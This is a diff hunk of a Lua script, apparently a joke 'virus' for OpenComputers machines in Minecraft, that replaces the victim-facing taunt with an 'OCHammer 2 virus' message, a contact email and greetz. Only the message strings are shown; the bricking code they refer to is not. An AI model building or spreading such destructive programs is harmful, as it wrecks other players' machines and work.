@@ -38,13 +38,13 @@ function lol()
 
     -- display some greetz and stuff
     local ok = {
-        "Looks like you broke the rules, do ya?";
-        "Now your OpenComputer is broken!";
-        "";
-        "I hope you're happy using your new OpenComputer.";
-        "Broken, classic, shiny. Can't even boot into MineOS.";
-        "Replacing the EEPROM is for broke people. Get a new Computer!";
-        "";
+        "There is no going back as your OpenComputer";
+        "got WRECKED by the OCHammer 2 virus.";
+        "It is a sad thing, that your adventures have ended here!";
+        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
+        " ";
+        "Unbox a Computer 2 is coming soon, so stay tuned for the release!"
+        " ";
         -- put some greetz or something
         "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
         -- Feel free to check out Verdex cafe on Roblox.com
